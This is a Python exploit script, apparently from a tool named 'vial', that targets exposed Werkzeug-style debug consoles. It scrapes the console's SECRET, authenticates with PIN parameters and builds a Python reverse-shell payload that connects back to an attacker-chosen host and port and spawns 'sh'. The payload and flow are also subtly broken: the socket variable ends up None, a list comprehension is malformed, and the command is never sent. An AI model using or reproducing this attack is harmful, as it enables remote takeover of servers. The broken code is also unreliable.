import requests
from urllib.parse import urljoin
import re

import vial
from vial.authenticate import authenticate
from vial.utils import check_iface
from vial import prompt


def exploit() -> None:
    parameters = {
        "__debugger__": "yes",
        "frm": 0,
        "cmd": "pinauth",
        "pin": None,
        "s": None,
    }

    try:
        while True:
            url = prompt.ask("[bold blue][?][/] Enter the url")

            if "http" not in url[0:4]:
                vial.log.error("URL missing scheme")
                continue

            break
        url = urljoin(url, "console")
        resp = vial.web_session.get(url, allow_redirects=False)

        parameters["s"] = re.findall("SECRET = \"([^']{20})", resp.text)[0]
        authenticate(parameters, url)

        host = check_iface(prompt.ask("[bold blue][?][/] Enter the host", default="eth0"))
        port = prompt.ask("[bold blue][?][/] Enter the port", default="4444")

        parameters["cmd"] = f"import socket,sys,os,pty\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(('{host}', {port}))\n[os.dup2(s.fileno(), fd] for fd in (0,1,2)\npty.spawn('sh')"

    except requests.RequestException as e:
        return vial.log.error(
            f"Failed to fetch [bold]SECRET[/bold] from the server.\n{e}"
        )


if __name__ == "__main__":
    exploit()
